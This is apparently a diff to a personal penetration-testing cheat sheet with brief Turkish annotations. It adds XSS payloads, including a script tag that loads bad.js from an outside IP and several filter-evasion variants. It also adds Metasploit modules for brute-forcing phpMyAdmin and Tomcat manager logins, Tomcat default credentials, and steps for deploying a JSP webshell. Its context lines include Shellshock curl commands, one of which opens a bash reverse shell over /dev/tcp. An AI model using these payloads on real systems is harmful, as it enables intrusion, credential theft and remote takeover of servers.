@@ -1,4 +1,15 @@
-----------------------------------------------
+xss
+<script src="http://192.168.1.50:81/bad.js></script>
+<script>window.onload = function () {var link=document.getElementById("link"); link.href="http://newssite.com";}</script> : dom xss için
+<sCrIpt>alert("XsS")</scRiPt> : filtrelemeler için
+"><sCrIpt>alert("XsS")</scRiPt> : php_self ile oluşturulmuş linkler için
+<iMg SrC="x" oNeRRor="alert(1);"> : filtreleme için
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE : url ile encodelanarak
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<SVg/ONloAd = alert(1);>
+";alert(2);//
+';alert(1);//
+---------------------------------------------
 # curl
 curl -v -X OPTIONS http://<targetip>/test/
 curl --upload-file <file name> -v --url <url> -0 --http1.0
@@ -127,3 +138,18 @@ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' http://192.168.90.59/cgi-bin/test.sh --> reverse shell
 
 -------------------------------------------
+msfconsole search phpmyadmin_login : phpmyadmin auxiliary brute force
+
+------------------------------------------
+
+# Tomcat
+
+default port : 8080
+web site : ip/manager/html (defaul username,password / tomcat-tomcat)
+payload : /usr/share/webshells/laudanum/jsp/cmd.war - deploy payload
+web site payload : <ip>/cmd/cmd.jsp
+                    örnek: websitesi.com/cmd/cmd.jsp
+msfconsole:                    
+   scanner/http/tomcat_mgr_login : bruteforce
+   exploit/multi/http/tomcat_mgr_upload       
+   exploit/multi/http/tomcat_mgr_deploy
